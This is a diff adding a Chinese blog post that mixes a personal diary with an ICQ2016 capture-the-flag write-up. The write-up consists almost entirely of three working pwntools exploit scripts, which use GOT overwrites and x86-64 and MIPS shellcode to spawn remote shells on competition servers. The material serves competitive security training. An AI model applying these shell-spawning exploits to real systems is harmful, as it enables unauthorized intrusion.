@@ -224,7 +224,235 @@
         </header>                
     </div>
 </nav>
-      <div class="body-wrap"></div>
+      <div class="body-wrap"><article id="post-杂记-2016-7-18" class="article article-type-post" itemscope itemprop="blogPost">
+  
+    <div class="article-meta">
+      <a href="/2016/07/18/杂记-2016-7-18/" class="article-date">
+      <time datetime="2016-07-19T05:45:44.000Z" itemprop="datePublished">2016-07-18</time>
+</a>
+    </div>
+  
+  <div class="article-inner">
+    
+      <input type="hidden" class="isFancy" />
+    
+    
+      <header class="article-header">
+        
+  
+    <h1 class="article-title" itemprop="name">
+      杂记-2016-7-18
+    </h1>
+  
+
+      </header>
+      
+      <div class="article-info article-info-post">
+        
+
+        
+        <div class="clearfix"></div>
+      </div>
+      
+    
+    <div class="article-entry" itemprop="articleBody">
+      
+          
+        <h3 id="前记"><a href="#前记" class="headerlink" title="前记"></a>前记</h3><p>这阵子发生了太多事情了，刚打完的ICQ的pwn部分都没来及上传，就匆匆的回到了警校进行节奏紧凑的训练。说实话，这次训练的体能真的不是我的强项，每次体能训练完了就像具尸体一样，不过那样又如何？我本就不是一个轻易服输的人。</p>
+ <a id="more"></a>
+<h3 id="ICQ2016-WP"><a href="#ICQ2016-WP" class="headerlink" title="ICQ2016-WP"></a>ICQ2016-WP</h3><h3 id="pwn1"><a href="#pwn1" class="headerlink" title="pwn1"></a>pwn1</h3><p>exp如下：</p>
+<figure class="highlight python"><table><tr><td class="gutter"><pre><div class="line">1</div><div class="line">2</div><div class="line">3</div><div class="line">4</div><div class="line">5</div><div class="line">6</div><div class="line">7</div><div class="line">8</div><div class="line">9</div><div class="line">10</div><div class="line">11</div><div class="line">12</div><div class="line">13</div><div class="line">14</div><div class="line">15</div><div class="line">16</div><div class="line">17</div><div class="line">18</div><div class="line">19</div><div class="line">20</div><div class="line">21</div><div class="line">22</div><div class="line">23</div><div class="line">24</div><div class="line">25</div><div class="line">26</div><div class="line">27</div><div class="line">28</div><div class="line">29</div><div class="line">30</div><div class="line">31</div><div class="line">32</div><div class="line">33</div><div class="line">34</div><div class="line">35</div><div class="line">36</div><div class="line">37</div><div class="line">38</div><div class="line">39</div><div class="line">40</div><div class="line">41</div><div class="line">42</div><div class="line">43</div><div class="line">44</div><div class="line">45</div><div class="line">46</div><div class="line">47</div><div class="line">48</div><div class="line">49</div><div class="line">50</div><div class="line">51</div><div class="line">52</div><div class="line">53</div><div class="line">54</div><div class="line">55</div></pre></td><td class="code"><pre><div class="line"></div><div class="line"><span class="keyword">from</span> pwn <span class="keyword">import</span> *</div><div class="line"></div><div class="line">context(log_level=<span class="string">"debug"</span>)</div><div class="line"></div><div class="line"><span class="comment"># p = process("./pwn1")</span></div><div class="line">p  = remote(<span class="string">"106.75.37.29"</span>,<span class="number">10000</span>)</div><div class="line">elf = ELF(<span class="string">"./pwn1"</span>)</div><div class="line">scanf_plt = elf.symbols[<span class="string">"__isoc99_scanf"</span>]</div><div class="line">system_plt = elf.symbols[<span class="string">"system"</span>]</div><div class="line"></div><div class="line"><span class="comment"># system_got</span></div><div class="line"><span class="comment">#0x0804857E</span></div><div class="line"></div><div class="line"><span class="function"><span class="keyword">def</span> <span class="title">add</span><span class="params">(off,value)</span>:</span></div><div class="line">	p.recvuntil(<span class="string">"input index:"</span>)</div><div class="line">	p.sendline(str(off))</div><div class="line">	p.recvuntil(<span class="string">"value:"</span>)</div><div class="line">	p.sendline(str(value))</div><div class="line"></div><div class="line">	p.recvuntil(<span class="string">"input index:"</span>)</div><div class="line">	p.sendline(str(<span class="number">0x28</span><span class="number">-0xc</span>))</div><div class="line">	p.recvuntil(<span class="string">"value:"</span>)</div><div class="line">	p.sendline(<span class="string">"0"</span>)</div><div class="line"><span class="function"><span class="keyword">def</span> <span class="title">change</span><span class="params">(off,l)</span>:</span></div><div class="line">	i = <span class="number">0</span> </div><div class="line">	<span class="keyword">for</span> x <span class="keyword">in</span> l:</div><div class="line">		p1 = x &amp; <span class="number">0xff</span></div><div class="line">		p2 = (x &gt;&gt; <span class="number">8</span>) &amp; <span class="number">0xff</span></div><div class="line">		p3 = (x &gt;&gt; <span class="number">16</span>) &amp; <span class="number">0xff</span></div><div class="line">		p4 = (x &gt;&gt; <span class="number">24</span>) &amp; <span class="number">0xff</span></div><div class="line">		add(<span class="number">60</span><span class="number">-16</span>+i,p1)</div><div class="line">		i+=<span class="number">1</span></div><div class="line">		add(<span class="number">60</span><span class="number">-16</span>+i,p2)</div><div class="line">		i+=<span class="number">1</span></div><div class="line">		add(<span class="number">60</span><span class="number">-16</span>+i,p3)</div><div class="line">		i+=<span class="number">1</span></div><div class="line">		add(<span class="number">60</span><span class="number">-16</span>+i,p4)</div><div class="line">		i+=<span class="number">1</span></div><div class="line">	<span class="keyword">return</span> i</div><div class="line">l = [scanf_plt,<span class="number">0x080486ae</span>,<span class="number">0x080486ED</span>,<span class="number">0x804A028</span>,scanf_plt,<span class="number">0x080486ae</span>,<span class="number">0x080486ED</span>,<span class="number">0x804A02c</span>,system_plt,<span class="number">0x080486ae</span>,<span class="number">0x804A028</span>]</div><div class="line"><span class="comment">#system_plt,0x080486ae,0x804A028</span></div><div class="line"></div><div class="line">index = change(<span class="number">60</span>,l)</div><div class="line">p.recvuntil(<span class="string">"input index:"</span>)</div><div class="line">p.sendline(str(<span class="number">0x28</span><span class="number">-0xc</span>))</div><div class="line">p.recvuntil(<span class="string">"value:"</span>)</div><div class="line">p.sendline(<span class="string">"10"</span>)</div><div class="line">p.recvuntil(<span class="string">"Your Array:0 0 0 0 0 0 0 0 0 0 "</span>)</div><div class="line"><span class="comment"># gdb.attach(p,"b*0x0804857E\nc")</span></div><div class="line">p.sendline(str(u32(<span class="string">"/bin"</span>)))</div><div class="line">p.sendline(str(u32(<span class="string">"/sh\0"</span>)))</div><div class="line">p.interactive()</div><div class="line"></div><div class="line"><span class="comment">#flag&#123;9587c60c6962efc66d5adc7d18ee5500&#125;</span></div></pre></td></tr></table></figure>
+<h3 id="pwn2"><a href="#pwn2" class="headerlink" title="pwn2"></a>pwn2</h3><p>卡了一段时间，挺好玩的,exp如下：</p>
+<figure class="highlight python"><table><tr><td class="gutter"><pre><div class="line">1</div><div class="line">2</div><div class="line">3</div><div class="line">4</div><div class="line">5</div><div class="line">6</div><div class="line">7</div><div class="line">8</div><div class="line">9</div><div class="line">10</div><div class="line">11</div><div class="line">12</div><div class="line">13</div><div class="line">14</div><div class="line">15</div><div class="line">16</div><div class="line">17</div><div class="line">18</div><div class="line">19</div><div class="line">20</div><div class="line">21</div><div class="line">22</div><div class="line">23</div><div class="line">24</div><div class="line">25</div><div class="line">26</div><div class="line">27</div><div class="line">28</div><div class="line">29</div><div class="line">30</div><div class="line">31</div><div class="line">32</div><div class="line">33</div><div class="line">34</div><div class="line">35</div><div class="line">36</div></pre></td><td class="code"><pre><div class="line"><span class="keyword">from</span> pwn <span class="keyword">import</span> *</div><div class="line"></div><div class="line">context(log_level=<span class="string">"debug"</span>)</div><div class="line"></div><div class="line"><span class="comment"># p = process("./pwn2")</span></div><div class="line">p = remote(<span class="string">"106.75.37.31"</span>,<span class="number">23333</span>)</div><div class="line"></div><div class="line">p.recvuntil(<span class="string">"ight!\n\n"</span>)</div><div class="line"></div><div class="line">op_add_mv = chr((<span class="number">0xD70</span><span class="number">-0xb10</span>)/<span class="number">8</span>+<span class="number">43</span>)</div><div class="line">op_exit = chr((<span class="number">0xD40</span><span class="number">-0xb10</span>)/<span class="number">8</span>+<span class="number">43</span>)</div><div class="line">op_sub = chr((<span class="number">0xB28</span><span class="number">-0xb10</span>)/<span class="number">8</span>+<span class="number">43</span>)</div><div class="line">op_mov_l = chr((<span class="number">0xD20</span><span class="number">-0xb10</span>)/<span class="number">8</span>+<span class="number">43</span>)</div><div class="line"></div><div class="line"></div><div class="line"><span class="keyword">for</span> x <span class="keyword">in</span> range(<span class="number">0</span>,<span class="number">23</span>):</div><div class="line">	p.sendline(op_sub)</div><div class="line"><span class="keyword">for</span> x <span class="keyword">in</span> range(<span class="number">0</span>,<span class="number">0x2f</span>+<span class="number">2</span>):</div><div class="line">	p.sendline(op_add_mv)</div><div class="line"><span class="keyword">for</span> x <span class="keyword">in</span> range(<span class="number">0</span>,<span class="number">4</span>):</div><div class="line">	p.sendline(op_sub)</div><div class="line"></div><div class="line">shellcode = <span class="string">"\x90"</span>*<span class="number">60</span>+<span class="string">"\x31\xc0\x48\xbb\xd1\x9d\x96\x91\xd0\x8c\x97\xff\x48\xf7\xdb\x53\x54\x5f\x99\x52\x57\x54\x5e\xb0\x3b\x0f\x05"</span></div><div class="line"></div><div class="line">p.sendline(str(<span class="number">0x602080</span>+<span class="number">40</span>))</div><div class="line">p.sendline(str(<span class="number">0x602080</span>+<span class="number">40</span>))</div><div class="line">p.sendline(shellcode)</div><div class="line">p.sendline(op_mov_l)</div><div class="line">p.sendline(op_add_mv)</div><div class="line"></div><div class="line"><span class="comment"># gdb.attach(p,"b*0x400776\nc")</span></div><div class="line">p.sendline(op_exit)</div><div class="line">p.interactive()</div><div class="line"></div><div class="line"></div><div class="line"><span class="comment">#flag&#123;53ed43a93ec84fe99ddbd33d5acf5284&#125;</span></div></pre></td></tr></table></figure>
+<h3 id="pwn3"><a href="#pwn3" class="headerlink" title="pwn3"></a>pwn3</h3><p>没做出来，本地没有调试环境，卒。。</p>
+<p>后面fuzz了一下，exp如下:</p>
+<figure class="highlight python"><table><tr><td class="gutter"><pre><div class="line">1</div><div class="line">2</div><div class="line">3</div><div class="line">4</div><div class="line">5</div><div class="line">6</div><div class="line">7</div><div class="line">8</div><div class="line">9</div><div class="line">10</div><div class="line">11</div><div class="line">12</div><div class="line">13</div><div class="line">14</div><div class="line">15</div><div class="line">16</div><div class="line">17</div><div class="line">18</div><div class="line">19</div><div class="line">20</div><div class="line">21</div><div class="line">22</div></pre></td><td class="code"><pre><div class="line"><span class="keyword">from</span> pwn <span class="keyword">import</span> *</div><div class="line"></div><div class="line">context(log_level=<span class="string">"debug"</span>)</div><div class="line">shellcode1 = <span class="string">"\xff\xff\x10\x04\xab\x0f\x02\x24\x55\xf0\x46\x20\x66\x06\xff\x23\xc2\xf9\xec\x23\x66\x06\xbd\x23\x9a\xf9\xac\xaf\x9e\xf9\xa6\xaf\x9a\xf9\xbd\x23\x21\x20\x80\x01\x21\x28\xa0\x03\xcc\xcd\x44\x03/bin/sh\x00"</span></div><div class="line">shellcode2 = <span class="string">"\x28\x06\xff\xff\x3c\x0f\x2f\x2f\x35\xef\x62\x69\xaf\xaf\xff\xf4\x3c\x0e\x6e\x2f\x35\xce\x73\x68\xaf\xae\xff\xf8\xaf\xa0\xff\xfc\x27\xa4\xff\xf4\x28\x05\xff\xff\x24\x02\x0f\xab\x01\x01\x01\x0c"</span></div><div class="line"><span class="keyword">for</span> y <span class="keyword">in</span> range(<span class="number">0</span>,<span class="number">10</span>):</div><div class="line">	<span class="keyword">for</span> x <span class="keyword">in</span> range(<span class="number">0</span>,<span class="number">4</span>):</div><div class="line">		<span class="keyword">try</span>:</div><div class="line">			p = remote(<span class="string">"106.75.32.60"</span>,<span class="number">10000</span>)</div><div class="line">			p.recvuntil(<span class="string">"lp' for  help.\n"</span>)</div><div class="line">			p.sendline(<span class="string">"2057561479"</span>)</div><div class="line">			data = p.recvuntil(<span class="string">"\n"</span>)[<span class="number">-9</span>:<span class="number">-1</span>]</div><div class="line">			off = int(data,<span class="number">16</span>)</div><div class="line">			<span class="keyword">print</span> <span class="string">"shellcode_addr = "</span> +hex(off)</div><div class="line">			payload = <span class="string">"20160606 0"</span></div><div class="line">			payload += <span class="string">"\x00"</span>*(<span class="number">0x70</span>+y-len(shellcode2)-len(payload))+shellcode2+p32(off+<span class="number">29</span>+x)</div><div class="line">			<span class="comment"># payload += "\x00"*(0x74-len(shellcode2)-10)+shellcode+p32(off)</span></div><div class="line">			<span class="keyword">print</span>  y,x</div><div class="line">			p.sendline(payload)</div><div class="line">			p.interactive()</div><div class="line">		<span class="keyword">except</span>:</div><div class="line">			p.close()</div></pre></td></tr></table></figure>
+<h3 id="后记"><a href="#后记" class="headerlink" title="后记"></a>后记</h3><p>这阵子可能真的没有时间去做二进制研究了。</p>
+<p>直视自己。</p>
+
+      
+      
+        <div class="page-reward">
+          <p><a href="javascript:void(0)" onclick="dashangToggle()" class="dashang">赏</a></p>
+          <div class="hide_box"></div>
+          <div class="shang_box">
+            <a class="shang_close" href="javascript:void(0)" onclick="dashangToggle()">×</a>
+            <div class="shang_tit">
+              <p>你要赏我吃糖果吗？</p>
+            </div>
+            <div class="shang_payimg">
+              <img src="/img/alipayimg.jpg" alt="扫码支持" title="扫一扫" />
+            </div>
+              <div class="pay_explain">扫码打赏，你说多少就多少</div>
+            <div class="shang_payselect">
+              
+                <div class="pay_item checked" data-id="alipay">
+                  <span class="radiobox"></span>
+                  <span class="pay_logo"><img src="/img/alipay.png" alt="支付宝" /></span>
+                </div>
+              
+              
+                <div class="pay_item" data-id="wechat">
+                  <span class="radiobox"></span>
+                  <span class="pay_logo"><img src="/img/weixin.png" alt="微信" /></span>
+                </div>
+              
+            </div>
+            <div class="shang_info">
+              <p>打开<span id="shang_pay_txt">支付宝</span>扫一扫，即可进行扫码打赏哦</p>
+            </div>
+          </div>
+        </div>
+        <script type="text/javascript" src="//cdn.bootcss.com/zepto/1.2.0/zepto.min.js"></script>
+        <script type="text/javascript">
+          $(".pay_item").click(function(){
+            $(this).addClass('checked').siblings('.pay_item').removeClass('checked');
+            var dataid=$(this).attr('data-id');
+            $(".shang_payimg img").attr("src","/img/"+dataid+"img.jpg");
+            $("#shang_pay_txt").text(dataid=="alipay"?"支付宝":"微信");
+          });
+          function dashangToggle(){
+            
+            $(".hide_box").fadeToggle();
+            $(".shang_box").fadeToggle();
+          }
+        </script>
+      
+    </div>
+    
+  </div>
+  
+    
+    <div class="copyright">
+        <p><span>本文标题:</span><a href="/2016/07/18/杂记-2016-7-18/">杂记-2016-7-18</a></p>
+        <p><span>文章作者:</span><a href="/" title="访问 WinterSun 的个人博客">WinterSun</a></p>
+        <p><span>发布时间:</span>2016年07月18日 - 22时45分</p>
+        <p><span>最后更新:</span>2016年12月19日 - 18时34分</p>
+        <p>
+            <span>原始链接:</span><a class="post-url" href="/2016/07/18/杂记-2016-7-18/" title="杂记-2016-7-18">https://winter3un.github.io/2016/07/18/杂记-2016-7-18/</a>
+            <span class="copy-path" data-clipboard-text="原文: https://winter3un.github.io/2016/07/18/杂记-2016-7-18/　　作者: WinterSun" title="点击复制文章链接"><i class="fa fa-clipboard"></i></span>
+            <script src="/js/clipboard.min.js"></script>
+            <script> var clipboard = new Clipboard('.copy-path'); </script>
+        </p>
+        <p>
+            <span>许可协议:</span><i class="fa fa-creative-commons"></i> <a rel="license" href="http://creativecommons.org/licenses/by-nc-sa/3.0/cn/" title="中国大陆 (CC BY-NC-SA 3.0 CN)" target = "_blank">"署名-非商用-相同方式共享 3.0"</a> 转载请保留原文链接及作者。
+        </p>
+    </div>
+
+
+
+<nav id="article-nav">
+  
+    <a href="/2016/07/05/ICHUNQIU2016-PWN/" id="article-nav-newer" class="article-nav-link-wrap">
+      <strong class="article-nav-caption"><</strong>
+      <div class="article-nav-title">
+        
+          【ICQ2016】 writeup
+        
+      </div>
+    </a>
+  
+  
+    <a href="/2016/07/19/C-S-WeChat/" id="article-nav-older" class="article-nav-link-wrap">
+      <div class="article-nav-title">C/S-WeChat</div>
+      <strong class="article-nav-caption">></strong>
+    </a>
+  
+</nav>
+
+  
+</article>
+
+    <div id="toc" class="toc-article">
+    <strong class="toc-title">文章目录</strong>
+    <ol class="toc"><li class="toc-item toc-level-3"><a class="toc-link" href="#前记"><span class="toc-number">1.</span> <span class="toc-text">前记</span></a></li><li class="toc-item toc-level-3"><a class="toc-link" href="#ICQ2016-WP"><span class="toc-number">2.</span> <span class="toc-text">ICQ2016-WP</span></a></li><li class="toc-item toc-level-3"><a class="toc-link" href="#pwn1"><span class="toc-number">3.</span> <span class="toc-text">pwn1</span></a></li><li class="toc-item toc-level-3"><a class="toc-link" href="#pwn2"><span class="toc-number">4.</span> <span class="toc-text">pwn2</span></a></li><li class="toc-item toc-level-3"><a class="toc-link" href="#pwn3"><span class="toc-number">5.</span> <span class="toc-text">pwn3</span></a></li><li class="toc-item toc-level-3"><a class="toc-link" href="#后记"><span class="toc-number">6.</span> <span class="toc-text">后记</span></a></li></ol>
+</div>
+<input type="button" id="tocButton" value="隐藏目录"  title="点击按钮隐藏或者显示文章目录">
+
+<script src="//cdn.bootcss.com/jquery/1.11.1/jquery.min.js"></script>
+<script>
+    var valueHide = "隐藏目录";
+    var valueShow = "显示目录";
+
+    if ($(".left-col").is(":hidden")) {
+        $("#tocButton").attr("value", valueShow);
+    }
+    $("#tocButton").click(function() {
+        if ($("#toc").is(":hidden")) {
+            $("#tocButton").attr("value", valueHide);
+            $("#toc").slideDown(320);
+        }
+        else {
+            $("#tocButton").attr("value", valueShow);
+            $("#toc").slideUp(350);
+        }
+    })
+    if ($(".toc").length < 1) {
+        $("#toc, #tocButton").hide();
+    }
+</script>
+
+
+
+
+
+<div class="bdsharebuttonbox">
+	<a href="#" class="fx fa-weibo bds_tsina" data-cmd="tsina" title="分享到新浪微博"></a>
+	<a href="#" class="fx fa-weixin bds_weixin" data-cmd="weixin" title="分享到微信"></a>
+	<a href="#" class="fx fa-qq bds_sqq" data-cmd="sqq" title="分享到QQ好友"></a>
+	<a href="#" class="fx fa-facebook-official bds_fbook" data-cmd="fbook" title="分享到Facebook"></a>
+	<a href="#" class="fx fa-twitter bds_twi" data-cmd="twi" title="分享到Twitter"></a>
+	<a href="#" class="fx fa-linkedin bds_linkedin" data-cmd="linkedin" title="分享到linkedin"></a>
+	<a href="#" class="fx fa-files-o bds_copy" data-cmd="copy" title="分享到复制网址"></a>
+</div>
+<script>window._bd_share_config={"common":{"bdSnsKey":{},"bdText":"","bdMini":"2","bdMiniList":false,"bdPic":"","bdStyle":"2","bdSize":"24"},"share":{}};with(document)0[(getElementsByTagName('head')[0]||body).appendChild(createElement('script')).src='/static/api/js/share.js?v=89860593.js?cdnversion='+~(-new Date()/36e5)];</script>
+
+
+
+
+    
+
+
+
+    <div class="scroll" id="post-nav-button">
+        
+            <a href="/2016/07/05/ICHUNQIU2016-PWN/" title="上一篇: 【ICQ2016】 writeup">
+                <i class="fa fa-angle-left"></i>
+            </a>
+        
+        <a title="文章列表"><i class="fa fa-bars"></i><i class="fa fa-times"></i></a>
+        
+            <a href="/2016/07/19/C-S-WeChat/" title="下一篇: C/S-WeChat">
+                <i class="fa fa-angle-right"></i>
+            </a>
+        
+    </div>
+    <ul class="post-list"><li class="post-list-item"><a class="post-list-link" href="/2018/07/09/rsa-ctf/">CTF-RSA破解方式整理</a></li><li class="post-list-item"><a class="post-list-link" href="/2018/07/09/2018-706-wp/">2018 706 writeup</a></li><li class="post-list-item"><a class="post-list-link" href="/2018/04/19/ddctf-2018/">DDCTF-2018  WEB WRITEUP</a></li><li class="post-list-item"><a class="post-list-link" href="/2018/03/19/2018-n1ctf/">n1ctf 2018 web writeup</a></li><li class="post-list-item"><a class="post-list-link" href="/2018/02/20/2018-2-21/">低版本php+nginx 解析漏洞</a></li><li class="post-list-item"><a class="post-list-link" href="/2017/10/29/cve-2017-office/">对cve-2017-0199与cve-2017-8759的浅析</a></li><li class="post-list-item"><a class="post-list-link" href="/2017/08/16/2017-8-10/">810线下赛复盘</a></li><li class="post-list-item"><a class="post-list-link" href="/2017/08/10/2017-8-9/">8月9日个人赛总结 && writeup</a></li><li class="post-list-item"><a class="post-list-link" href="/2017/06/17/jarvisoj-web/">【web】jarvis oj 刷题</a></li><li class="post-list-item"><a class="post-list-link" href="/2017/06/04/heap-all/">【pwn】cuit2017 & 0ctf2017 heap总结</a></li><li class="post-list-item"><a class="post-list-link" href="/2017/06/03/墨色的五月/">墨色的五月</a></li><li class="post-list-item"><a class="post-list-link" href="/2017/04/27/2017-429-final/">【pwn】2017-429final</a></li><li class="post-list-item"><a class="post-list-link" href="/2017/04/22/429-2017/">【pwn】2017-429预赛</a></li><li class="post-list-item"><a class="post-list-link" href="/2017/04/10/arm-double-free-attack/">arm_double_free_attack</a></li><li class="post-list-item"><a class="post-list-link" href="/2017/04/09/初探pwntools-fmt特性/">【pwn】 初探pwntools fmt特性</a></li><li class="post-list-item"><a class="post-list-link" href="/2017/04/08/how-to-get-libc/">how_to_get_libc</a></li><li class="post-list-item"><a class="post-list-link" href="/2017/04/08/T3CTF2017/">【pwn】T3CTF2017 堆溢出以及return to  dl slove</a></li><li class="post-list-item"><a class="post-list-link" href="/2017/04/07/ARM-overflow/">ARM环境下栈溢出攻击初探</a></li><li class="post-list-item"><a class="post-list-link" href="/2017/04/06/fastbin-attack/">fastbin attack 利用</a></li><li class="post-list-item"><a class="post-list-link" href="/2017/03/17/FILE结构体的溢出利用【FSP】/">FILE结构体的溢出利用【FSP】</a></li><li class="post-list-item"><a class="post-list-link" href="/2016/10/05/xdctf2016-wp/">XDCTF2016_铁人三项_WP（HTTP数据包的快速分析）</a></li><li class="post-list-item"><a class="post-list-link" href="/2016/07/19/C-S-WeChat/">C/S-WeChat</a></li><li class="post-list-item"><a class="post-list-link" href="/2016/07/18/杂记-2016-7-18/">杂记-2016-7-18</a></li><li class="post-list-item"><a class="post-list-link" href="/2016/07/05/ICHUNQIU2016-PWN/">【ICQ2016】 writeup</a></li><li class="post-list-item"><a class="post-list-link" href="/2016/06/20/CCF2016/">【CFF2016-pwn】 Writeup</a></li><li class="post-list-item"><a class="post-list-link" href="/2016/06/08/python命令行执行系统命令/">python沙盒绕过</a></li><li class="post-list-item"><a class="post-list-link" href="/2016/06/08/wargame-pwnable-bf/">[wargame-pwnable] bf</a></li><li class="post-list-item"><a class="post-list-link" href="/2016/06/08/2015-问鼎杯线下PWN/">2015-问鼎杯线下PWN</a></li><li class="post-list-item"><a class="post-list-link" href="/2016/06/08/【pwn】诡异的movsx和cdqe/">【pwn】诡异的movsx和cdqe</a></li><li class="post-list-item"><a class="post-list-link" href="/2016/06/08/Auto-post/">Auto post</a></li><li class="post-list-item"><a class="post-list-link" href="/2016/05/20/pwn-关于栈的迁移/">[pwn] 关于栈的迁移</a></li><li class="post-list-item"><a class="post-list-link" href="/2016/05/19/hexo-build/">hexo build</a></li><li class="post-list-item"><a class="post-list-link" href="/2016/05/18/mprotect/">mprotect 之痛</a></li></ul>
+    <script src="/live2d/js/jquery.js"></script>
+    <script>
+        $(".post-list").addClass("toc-article");
+        $(".post-list-item a").attr("target","_blank");
+        $("#post-nav-button > a:nth-child(2)").click(function() {
+            $(".fa-bars, .fa-times").toggle();
+            $(".post-list").toggle(300);
+            if ($(".toc").length > 0) {
+                $("#toc, #tocButton").toggle(200, function() {
+                    if ($(".switch-area").is(":visible")) {
+                        $("#tocButton").attr("value", valueHide);
+                        }
+                    })
+            }
+            else {
+            }
+        })
+    </script>
+
+
+
+    <script>
+        
+    </script>
+</div>
       <footer id="footer">
     <div class="outer">
         <div id="footer-info">
